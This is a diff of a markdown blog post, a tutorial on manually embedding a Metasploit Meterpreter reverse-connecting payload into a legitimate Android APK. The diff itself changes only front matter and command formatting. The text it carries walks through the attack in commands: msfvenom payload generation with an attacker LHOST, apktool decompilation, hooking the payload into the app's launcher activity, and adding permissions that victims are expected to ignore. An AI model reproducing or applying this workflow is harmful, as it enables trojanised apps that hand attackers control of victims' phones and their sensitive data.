@@ -1,15 +1,11 @@
 ---
-layout: post
-comments: true
 date: 'Sat Dec 19 2015 20:45:25 GMT+0530 (India Standard Time)'
-slug: embed-metasploit-payload-in-apk-manually
-title: Embed a Metasploit Payload in an original .apk File | Part 2 - Do it manually
+title: Embed a Metasploit Payload in an Original .apk File | Part 2 - Do it Manually
 tags:
   - Android
   - Hacking
   - Kali Linux
   - Metasploit
-published: true
 ---
 
 Metasploit's flagship product, the Meterpreter, is very powerful and an all-purpose payload. Once installed on the victim machine, we can do whatever we want to their system by sending out commands to it. For example, we could grab sensitive data out of the compromised system.
@@ -29,7 +25,7 @@ We will also need some libraries and tools in the following steps, so I think it
 
 To install the required libraries, enter this command at the console:
 ```console
-apt-get install lib32stdc++6 lib32ncurses5 lib32z1
+$ sudo apt-get install lib32stdc++6 lib32ncurses5 lib32z1
 ```
 
 And to get the latest version of ApkTool, head over to [this site](http://ibotpeaches.github.io/Apktool/install/) and follow the installation instructions.
@@ -57,7 +53,7 @@ That's about it. I will also show you how can you get a working Meterpreter sess
 
 First of all, we have to make the Meterpreter payload. We are going to use MSFVenom for this. The command is-
 ```console
-msfvenom -p android/meterpreter/[Payload_Type] LHOST=[IP_Address] LPORT=[Incoming_Port] -o meterpreter.apk
+$ msfvenom -p android/meterpreter/[Payload_Type] LHOST=[IP_Address] LPORT=[Incoming_Port] -o meterpreter.apk
 ```
 
 Replace [Payload_Type] by any of the following payloads available. The function of all these payloads are same, essentially they are all Meterpreter payloads, the difference is only in the method they use to connect to your Kali system. The available [Payload_Type]s are -
@@ -70,7 +66,7 @@ You can use any one you like, I'm going to use reverse_https as an example.
 
 Replace [IP_Address] by the IP address to which the payload is going to connect back to, i.e the IP address of the attacker's system. If you are going to perform this attack over a local network (eg. if the victim and attacker are connected to the same WiFi hotspot), your Local IP will suffice. To know what your local IP is, run the command -
 ```console
-ifconfig
+$ ifconfig
 ```
 ![Screenshot from 2015-12-18 13:56:49](/images/posts/screenshot-from-2015-12-18-135649.png)
 
@@ -89,8 +85,8 @@ So run the command using replacing the keywords with appropriate values and MSFV
 
 Now we have to decompile the APKs, for this we are going to use APKTool. It decompiles the code to a fairly human-readable format and saves it in .smali files, and also successfully extracts the .xml files. Assuming you have already installed the latest apktool and also have the original apk file in the root directory, run the following commands -
 ```console
-apktool d -f -o payload /root/meterpreter.apk
-apktool d -f -o original /root/[Original_APK_Name] 
+$ apktool d -f -o payload /root/meterpreter.apk
+$ apktool d -f -o original /root/[Original_APK_Name] 
 ```   
 It will decompile the payload to "/root/payload" and the original apk to "/root/original" directory.
 
@@ -123,7 +119,7 @@ Those two lines we searched for signifies that this is the activity which is goi
 
 Now that we have the name of the activity we want to inject the hook into, let's get to it! First of all, open the .smali code of that activity using gedit. Just open a terminal and type -
 ```console
-gedit /root/original/smali/[Activity_Path]
+$ gedit /root/original/smali/[Activity_Path]
 ```
 
 Replace the [Activity_Path] with the activity's "android:name", but instead of the dots, type slash. Actually the smali codes are stored in folders named in the format the "android:name" is in, so we can easily get the location of the .smali code in the way we did. Check the screenshot below and you will get an idea of what I'm trying to say.
@@ -152,7 +148,7 @@ From developer.android.com -
 
 If we do not mention all the additional permissions that our payload is going to need, it cannot function properly. While installing an app, these permissions are shown to the user. But most of the users don't care to read all those boring texts, so we do not have to worry about that much.
 
-These permissions are also listed in the previously encountered AndroidManifest file. So let's open the AndroidManifest.xml of both the original app and the payload from the respective folders. The permissions are mentioned inside <uses-permission> tag as an attribute 'android:name'. Copy the additional permission lines from the Payload's AndroidManifest to the original app's one. But be careful that there should not be any duplicate.
+These permissions are also listed in the previously encountered AndroidManifest file. So let's open the AndroidManifest.xml of both the original app and the payload from the respective folders. The permissions are mentioned inside `<uses-permission>` tag as an attribute 'android:name'. Copy the additional permission lines from the Payload's AndroidManifest to the original app's one. But be careful that there should not be any duplicate.
 
 Here's my original app's AndroidManifest before editing -
 ![Screenshot from 2015-12-19 19:37:12](/images/posts/screenshot-from-2015-12-19-193712.png)
